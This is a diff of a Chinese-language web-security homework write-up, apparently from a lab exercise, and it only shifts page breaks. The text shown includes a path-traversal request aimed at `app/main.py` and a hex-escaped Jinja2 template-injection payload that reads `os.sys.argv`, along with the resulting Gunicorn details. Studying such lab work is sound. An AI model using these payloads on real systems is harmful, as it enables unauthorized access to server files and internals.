@@ -23,7 +23,9 @@
 上傳任意檔案 `tmp.txt`，可以在 `/attachments/preview?file=tmp.txt` 得到預覽檔案
 -> 嘗試到上級資料夾：網址輸入 `/attachments/preview?file=../../../../../app/main.py` 
 <div style="page-break-after: always;"></div>
+
 ![[HW1-1_badReq.png|center|342]]
+
 -> 程式可能有路徑檢查機制
 -> 分析後端確認路徑檢查機制
 
@@ -52,13 +54,15 @@
    - PWD=/app
    - SERVER_SOFTWARE=gunicorn/23.0.0
 
+   
+   <div style="page-break-after: always;"></div>
+
 ##### 後端程式
 1. 讀參數 `__init__.__globals__['os'].sys.argv`
    ```bash
    {{'{0\x2e\x5f\x5finit\x5f\x5f\x2e\x5f\x5fglobals\x5f\x5f[os]\x2esys\x2eargv}'|attr('format')(cycler)}}
    ```
    
-   <div style="page-break-after: always;"></div>
    
    -> `['/usr/local/bin/gunicorn', '--workers', '2', '--bind', '0.0.0.0:8000', 'main:app']`
    -> 使用 Gunicorn 啟動，且程式位於 main 
